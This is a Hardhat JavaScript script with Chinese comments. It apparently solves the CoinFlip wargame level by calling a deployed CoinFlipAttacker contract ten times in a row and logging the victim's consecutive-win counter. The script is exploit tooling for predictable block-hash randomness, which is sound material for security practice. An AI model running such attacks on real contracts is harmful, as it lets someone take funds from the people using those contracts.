import hre from "hardhat";

// 替換成 CoinFlip 實例合約地址
const contractAddress = "0x6e944eE85EE41F35D8Adcc7B7a3DE07bEb2f6dF1"; 
console.log("目標 CoinFlip 實例合約地址:", contractAddress);

// 替換成 CoinFlipExtensions 實例合約地址
const contractAddress_CoinFlipExtensions = "0x74291DD387199C17B584D13a11151Ae3b4e9e2A6"; 
console.log("目標 CoinFlipExtensions 實例合約地址:", contractAddress_CoinFlipExtensions);

// 替換成 CoinFlipAttacker 實例合約地址
const contractAddress_CoinFlipAttacker = "0xC7a0d13a00959f9B3b04878d3511220A98008F3A"; 
console.log("目標 CoinFlipAttacker 實例合約地址:", contractAddress_CoinFlipAttacker);

// 透過 hre.ethers 獲取 signer（帳戶）
const [signer] = await hre.ethers.getSigners();
console.log("我的帳戶地址: ", signer.address);

// 獲取 CoinFlip 實例合約
const coinFlip = await hre.ethers.getContractAt("CoinFlip", contractAddress);

// 獲取 CoinFlipExtensions 實例合約
const coinFlipExtensions = await hre.ethers.getContractAt("CoinFlipExtensions", contractAddress_CoinFlipExtensions);

// 獲取 CoinFlipAttacker 實例合約
const coinFlipAttacker = await hre.ethers.getContractAt("CoinFlipAttacker", contractAddress_CoinFlipAttacker);

async function main() {
   console.log("CoinFlipExtensions 區塊號: ", await coinFlipExtensions.getBlockNumber());
   console.log("CoinFlipExtensions 區塊哈希值: ", await coinFlipExtensions.getBlockValue());
   console.log("CoinFlipExtensions 翻硬幣: ", await coinFlipExtensions.getCoinFlip());

    console.log("起始 CoinFlip consecutiveWins: ", await coinFlip.consecutiveWins());

    // 進行攻擊
    for (let i = 0; i < 10; i++) {
        const tx = await coinFlipAttacker.attack();
        await tx.wait(); // 等待交易被挖掘，進入下一個區塊
        const wins = await coinFlip.consecutiveWins();
        console.log(`第 ${i + 1} 次攻擊後，consecutiveWins: ${wins}`);
    }
   
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
  